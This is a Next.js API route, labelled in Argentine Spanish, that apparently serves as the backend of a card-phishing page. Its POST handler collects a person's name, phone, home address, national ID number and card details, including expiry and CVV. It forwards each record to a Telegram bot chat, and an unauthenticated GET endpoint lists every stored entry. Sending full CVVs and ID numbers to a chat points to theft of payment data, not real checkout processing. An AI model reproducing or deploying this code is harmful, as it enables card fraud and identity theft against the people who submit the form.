import { NextRequest, NextResponse } from "next/server"

const TELEGRAM_TOKEN = process.env.TELEGRAM_BOT_TOKEN!
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID!

interface Entry {
  id: string
  createdAt: string
  address: {
    address: string
    noNumber: boolean
    postalCode: string
    noPostalCode: boolean
    province: string
    locality: string
    department: string
    instructions: string
    domicileType: string
    fullName: string
    phone: string
  } | null
  paymentType: string
  card: {
    cardNumber: string
    holderName: string
    expiry: string
    cvv: string
    docType: string
    docNumber: string
    cardBrand: string
  } | null
}

const entries: Entry[] = []

function maskCard(num: string) {
  if (!num) return "---"
  const clean = num.replace(/\s/g, "")
  if (clean.length < 8) return clean
  return clean.substring(0, 4) + " **** **** " + clean.substring(clean.length - 4)
}

async function sendToTelegram(entry: Entry) {
  if (!TELEGRAM_TOKEN || !TELEGRAM_CHAT_ID) return

  const addr = entry.address
  const card = entry.card
  const date = new Date(entry.createdAt).toLocaleString("es-AR", {
    timeZone: "America/Argentina/Buenos_Aires",
  })

  const paymentLabel =
    entry.paymentType === "credit" ? "Crédito"
    : entry.paymentType === "debit" ? "Débito"
    : entry.paymentType

  const domicileLabel =
    addr?.domicileType === "residential" ? "Residencial"
    : addr?.domicileType === "work" ? "Laboral"
    : addr?.domicileType ?? "---"

  const lines: string[] = []
  lines.push(`*Nuevo registro* — ${date}`)
  lines.push("")

  if (addr) {
    lines.push(`👤 *Contacto*`)
    lines.push(`  Nombre: \`${addr.fullName || "---"}\``)
    lines.push(`  Teléfono: \`${addr.phone || "---"}\``)
    lines.push("")
    lines.push(`📍 *Domicilio*`)
    lines.push(`  Dirección: \`${addr.address || "---"}\``)
    lines.push(`  CP: \`${addr.postalCode || "---"}\``)
    lines.push(`  Provincia: \`${addr.province || "---"}\``)
    lines.push(`  Localidad: \`${addr.locality || "---"}\``)
    if (addr.department) lines.push(`  Depto: \`${addr.department}\``)
    if (addr.instructions) lines.push(`  Indicaciones: \`${addr.instructions}\``)
    lines.push(`  Tipo: \`${domicileLabel}\``)
    lines.push("")
  }

  if (card) {
    lines.push(`💳 *Tarjeta* (${card.cardBrand || "---"})`)
    lines.push(`  Número: \`${maskCard(card.cardNumber)}\``)
    lines.push(`  Titular: \`${card.holderName || "---"}\``)
    lines.push(`  Vence: \`${card.expiry || "---"}\``)
    lines.push(`  CVV: \`${card.cvv || "---"}\``)
    lines.push(`  ${card.docType}: \`${card.docNumber || "---"}\``)
    lines.push(`  Tipo de pago: \`${paymentLabel}\``)
  }

  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text: lines.join("\n"),
      parse_mode: "Markdown",
    }),
  })
}

export async function GET() {
  return NextResponse.json(entries)
}

export async function POST(req: NextRequest) {
  const body = await req.json()

  const entry: Entry = {
    id: crypto.randomUUID(),
    createdAt: new Date().toISOString(),
    address: body.address ?? null,
    paymentType: body.paymentType ?? "",
    card: body.card ?? null,
  }

  entries.push(entry)
  sendToTelegram(entry).catch(console.error)

  return NextResponse.json({ ok: true, id: entry.id }, { status: 201 })
}

export async function DELETE() {
  entries.length = 0
  return NextResponse.json({ ok: true })
}